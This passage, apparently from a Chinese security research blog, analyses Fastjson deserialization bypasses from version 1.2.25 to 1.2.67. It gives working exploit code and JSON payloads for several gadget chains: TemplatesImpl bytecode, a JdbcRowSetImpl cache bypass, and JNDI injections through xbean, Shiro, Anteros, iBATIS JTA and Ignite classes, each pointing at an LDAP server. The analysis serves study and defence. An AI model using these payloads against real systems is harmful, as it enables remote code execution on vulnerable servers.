class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>; <span class="hljs-comment">//用[&#123;来绕过</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;[&#123;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408311541263.png" alt="image-20240831154143113"></p><p>分析一下这个payload的原理，首先前面我们知道只加一个[是可以进入loadClass里面的，但是此时会json解析错误</p><p><img src="https://cdn.clown2024.cn/202408311550012.png" alt="image-20240831155047869"></p><p>这里说期待一个[但是在第七十一位置是’,’，就是TemplatesImpl后面那个逗号的位置</p><p>那我们就补上一个[</p><p><img src="https://cdn.clown2024.cn/202408311554785.png" alt="image-20240831155444662"></p><p>然后又说缺少一个{，那再补上去即可</p><blockquote><p>不过怪怪的这就能解析成功了？😢</p></blockquote><h1 id="fastjson1225-1247通杀"><a href="#FastJson1-2-25-1-2-47通杀" class="headerlink" title="FastJson1.2.25-1.2.47通杀"></a>FastJson1.2.25-1.2.47通杀</h1><p><strong>影响版本</strong></p><p>1.2.25-1.2.32:</p><p>未开启AutoTypeSupport时能成功利用，开启了反而不行</p><p>1.2.33-1.2.47:</p><p>无论是否开启AutoTypeSupport都能成功利用</p><p><strong>其他的限制</strong></p><p>基于RMI利用的JDK版本&lt;&#x3D;6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;&#x3D;6u211、7u201、8u191</p><h2 id="1225ltx3dfastjsonltx3d1232"><a href="#1-2-25" class="headerlink" title="1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.32"></a>1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.32</h2><p>先给出exp，这里用的JdbcRowSetImpl的链子</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408311634449.png" alt="image-20240831163451309"></p><p>整体思路：通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。</p><p>去看一下他的checkAutoType函数来分析一下</p><p><img src="https://cdn.clown2024.cn/202408311638035.png" alt="image-20240831163822049"></p><p>我们先从缓存中去获取这个类，然后为null直接到findClass这里，这里的缓存mapping在一开始的时候会自动执行静态代码块放一些类进去</p><p><img src="https://cdn.clown2024.cn/202408311643708.png" alt="image-20240831164311603"></p><p>然后遍历buckets，根据键值查找是否存在该类，这里是可以直接找到的，然后判断clazz不为空后直接返回</p><p>然后一路往下走到deserialize的地方</p><p><img src="https://cdn.clown2024.cn/202408311646395.png" alt="image-20240831164635293"></p><p>这里调用的是**MiscCodec.deserialze()**，走进去跟进</p><p><img src="https://cdn.clown2024.cn/202408311649743.png" alt="image-20240831164903622"></p><p>往下到这里，判断键值是否为val，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量</p><p><img src="https://cdn.clown2024.cn/202408311650152.png" alt="image-20240831165057048"></p><p>这里赋值了给strVal</p><p>然后继续往下</p><p><img src="https://cdn.clown2024.cn/202408311658049.png" alt="image-20240831165810941"></p><p>判断clazz是否为Class.class，然后到这里loadClass</p><p><img src="https://cdn.clown2024.cn/202408311659949.png" alt="image-20240831165951852"></p><p>load完之后就会放入缓存中</p><p>然后在扫描第二部分JSON数据的时候，由于我们的类已经被放在缓存中了，我们在前面的**TypeUtils.getClassFromMapping(typeName)**就能获取到clazz，然后直接返回</p><p><img src="https://cdn.clown2024.cn/202408311703708.png" alt="image-20240831170308601"></p><p>可以看到直接返回从而绕过了checkAutoType</p><p>然后如果开启了autoTypeSupport的话就会无法绕过前面的黑名单，所以开启了反而不行</p><p><img src="https://cdn.clown2024.cn/202408311704028.png" alt="image-20240831170428910"></p><h2 id="1233ltx3dfastjsonltx3d1247"><a href="#1-2-33" class="headerlink" title="1.2.33&lt;&#x3D;Fastjson&lt;&#x3D;1.2.47"></a>1.2.33&lt;&#x3D;Fastjson&lt;&#x3D;1.2.47</h2><p>这部分的版本开了autoTypeSupport是可以成功</p><p><strong>未开启autoType时</strong></p><p>这里就和前面一样就不用分析了</p><p><strong>开启autoType时</strong></p><p>这里checkAutoType改了一点地方</p><p><img src="https://cdn.clown2024.cn/202408311724426.png" alt="image-20240831172445310"></p><p>这里多了一个判断，需要**TypeUtils.getClassFromMapping(typeName)**返回为null才行，我们这里返回不为null自然也不会抛出异常</p><h1 id="fastjson1248-1268"><a href="#Fastjson1-2-48-1-2-68" class="headerlink" title="Fastjson1.2.48-1.2.68"></a>Fastjson1.2.48-1.2.68</h1><p>这部分版本很多都是用黑名单绕过的利用方式，参考文章：<a href="https://www.anquanke.com/post/id/232774">https://www.anquanke.com/post/id/232774</a></p><h2 id="fastjsonltx3d1262"><a href="#Fastjson" class="headerlink" title="Fastjson&lt;&#x3D;1.2.62"></a>Fastjson&lt;&#x3D;1.2.62</h2><p>一样先给个payload</p><p>org.apache.xbean.propertyeditor.JndiConverter类的toObjectImpl()函数存在JNDI注入漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;ldap://127.0.0.1:9999/zoZdyoJH&quot;&#125;;<br></code></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-comment">//fastjson1.2.62</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Advanced_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;&#125;&quot;</span>;<br>        JSON.parse(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该利用方式还需要我们满足一些前置条件：</p><ul><li><p>需要开启AutoType；</p></li><li><p>Fastjson &lt;&#x3D; 1.2.62；</p></li><li><p>JNDI注入利用所受的JDK版本限制；</p></li><li><p>目标服务端需要存在xbean-reflect包；</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-reflect<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><img src="https://cdn.clown2024.cn/202408312240189.png" alt="image-20240831224018027"></p><p><strong>调试分析</strong></p><p>先根据payload看一下利用的点</p><p>看一下关键类<strong>JndiConverter</strong>的jndi利用点</p><p><img src="https://cdn.clown2024.cn/202409010012684.png" alt="image-20240901001248560"></p><p>那就是需要我们的set方法能够触发到该类，然后看payload可以知道是触发了一个<strong>setAsText</strong>方法，但是这个类没有，那就应该是在父类里面，我们可以往上查找调用类，最终是找到了一个<strong>AbstractConverter</strong>的类</p><p><img src="https://cdn.clown2024.cn/202409010015651.png" alt="image-20240901001557551"></p><p><img src="https://cdn.clown2024.cn/202409010016240.png" alt="image-20240901001634139"></p><p>他这里调用了toObject方法</p><p><img src="https://cdn.clown2024.cn/202409010017706.png" alt="image-20240901001722611"></p><p>然后调用了toObjectImpl方法，最终到我们执行jndi的地方</p><p>利用链的流程知道了，现在来看一下checkAutoType函数的流程，主要是看看他新增的逻辑，这里分析的是开启autoTypeSupport的时候</p><p><img src="https://cdn.clown2024.cn/202409010028755.png" alt="image-20240901002806625"></p><p>这里会先进到第一部分的黑白名单判断，由于该类不在黑白名单内就直接往下走</p><p><img src="https://cdn.clown2024.cn/202409010032724.png" alt="image-20240901003236610"></p><p>一路走到这个类，此时clazz为null且开启了autoTypeSupport，就直接loadClass，后面就是正常的反序列化流程了</p><p><strong>未开启autoTypeSupport</strong></p><p><img src="https://cdn.clown2024.cn/202409010037003.png" alt="image-20240901003743874"></p><p>他会进到这里的判断逻辑，也是正常的黑白名单校验直接过去，主要的是他会走到下面这个地方</p><p><img src="https://cdn.clown2024.cn/202409010039269.png" alt="image-20240901003925151"></p><p>这里会直接抛异常所以也就不会loadClass了</p><h2 id="fastjson1266"><a href="#Fastjson1-2-66" class="headerlink" title="Fastjson1.2.66"></a>Fastjson1.2.66</h2><p>该版本也是黑名单绕过，1.2.66涉及多条Gadget链，原理都是存在JDNI注入漏洞。</p><p>给出各链子的payload</p><p>org.apache.shiro.realm.jndi.JndiRealmFactory类PoC：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;jndiNames&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;Realms&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>br.com.anteros.dbcp.AnterosDBCPConfig类PoC：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><br>或<br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Properties&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;UserTransaction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>满足条件：</p><ul><li>开启AutoType；</li><li>Fastjson &lt;&#x3D; 1.2.66；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</li><li>br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包；</li><li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li></ul><p>emmm我调试了一下1.2.62的payload，发现他的判断逻辑没有什么变化，只是把黑名单增加了应该是，所以直接在黑名单处被检测到然后抛出异常</p><p><img src="https://cdn.clown2024.cn/202409010044210.png" alt="image-20240901004414066"></p><p>所以autoType的部分就不分析了，就看各payload的利用链就好</p><p><strong>org.apache.shiro.realm.jndi.JndiRealmFactory</strong></p><p>先导入依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shiro_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409010104683.png" alt="image-20240901010441536"></p><p>我们直接去看一下<strong>JndiRealmFactory</strong>这个类，发现他的getRealms方法存在JNDI注入</p><p><img src="https://cdn.clown2024.cn/202409010113706.png" alt="image-20240901011300563"></p><p>然后是遍历jndiNames来传入参数，所以这里payload设置一个jndiNames数组</p><p>get方法调用：</p><p>至于这里为什么调用get而不是set，也补充一下前面没有提到这个</p><p>还记得前面有对各种方法和字段遍历的JavaBeanInfo的封装吧</p><p><img src="https://cdn.clown2024.cn/202409010144471.png" alt="image-20240901014448343"></p><p>这个版本虽然改了一点，但不影响目前的分析，这个箭头所指的就是在遍历类的get方法，我们看一下执行了什么操作</p><p><img src="https://cdn.clown2024.cn/202409010150192.png" alt="image-20240901015008065"></p><p>这里对返回值的类型进行了判断，如果为符合的类型进到逻辑里面，我们这里传的是[]且get方法返回值为Collection符合返回值为Collection的情况所以会继续往下</p><p><img src="https://cdn.clown2024.cn/202409010210700.png" alt="image-20240901021056578"></p><p>然后如果类里面没有set方法就会走到这里遍历get方法的这一步，不然就会进入到上一步的continue，因为前面的一个遍历method是优先set方法，最后同样是add进了fieldList</p><p>然后跟进去newFieldInfo里面，这里要注意一个重要的属性<strong>getOnly</strong></p><p><img src="https://cdn.clown2024.cn/202409010215166.png" alt="image-20240901021533021"></p><p>在这里面将getOnly赋值为了true</p><p>然后一路跟进最后会进到这个方法</p><p><img src="https://cdn.clown2024.cn/202409010221406.png" alt="image-20240901022101254"></p><p>此时getOnly已经为true，继续往下</p><p><img src="https://cdn.clown2024.cn/202409010221503.png" alt="image-20240901022129364"></p><p>最终走到这执行了get方法</p><p>所以总结执行get方法的条件(不过主要是针对用了parse方法而没用parseObject，因为parseObject本身就会连get一起执行)：</p><p>parse他会去优先去匹配调用字段的set方法，如果没有set方法，就会去寻找字段的get方法且返回值要是Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</p><blockquote><p>所以前面可能写的有点乱，因为写到这才真正调会get和set的调用😢</p></blockquote><p><strong>br.com.anteros.dbcp.AnterosDBCPConfig</strong></p><p>导入依赖：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-Core --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>br.com.anteros<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Anteros-Core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-DBCP --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>br.com.anteros<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Anteros-DBCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Anteros_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload1=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&quot;</span>;<br>        String payload2=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>payload1分析</strong></p><p>调用AnterosDBCPConfig#setMetricRegistry</p><p><img src="https://cdn.clown2024.cn/202409011042417.png" alt="image-20240901104216255"></p><p>然后调用AnterosDBCPConfig#getObjectOrPerformJndiLookup</p><p><img src="https://cdn.clown2024.cn/202409011043947.png" alt="image-20240901104316840"></p><p>这里存在jndi注入漏洞</p><p><strong>payload2分析</strong></p><p>调用AnterosDBCPConfig#setHealthCheckRegistry</p><p><img src="https://cdn.clown2024.cn/202409011044736.png" alt="image-20240901104447626"></p><p>调用AnterosDBCPConfig#getObjectOrPerformJndiLookup</p><p><img src="https://cdn.clown2024.cn/202409011045210.png" alt="image-20240901104535103"></p><p>这里存在jndi注入漏洞</p><blockquote><p>这个Anteros看maven仓库用的人好少，感觉比较难碰到</p></blockquote><p><strong>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</strong></p><p>导入依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ibatis/ibatis-sqlmap --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ibatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ibatis-sqlmap<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.726<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.transaction<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JTA_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&#125;&quot;</span>;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409011109175.png" alt="image-20240901110919034"></p><p>利用链分析</p><p>首先调用到JtaTransactionConfig#setProperties方法</p><p><img src="https://cdn.clown2024.cn/202409011111348.png" alt="image-20240901111125227"></p><p>这里存在jndi漏洞，但是utxName获取为固定的键值，为Properties对象的UserTransaction</p><p>所以payload里的properties值的设置为Properties类然后加一个UserTransaction属性</p><h2 id="fastjson1267"><a href="#Fastjson1-2-67" class="headerlink" title="Fastjson1.2.67"></a>Fastjson1.2.67</h2><p>也是黑名单绕过，直接给payload，不想分析了（</p><p>这里的条件也是开启autoType</p><p><strong>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</strong></p><p>需要ignite-core、ignite-jta和jta依赖</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-jta --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span 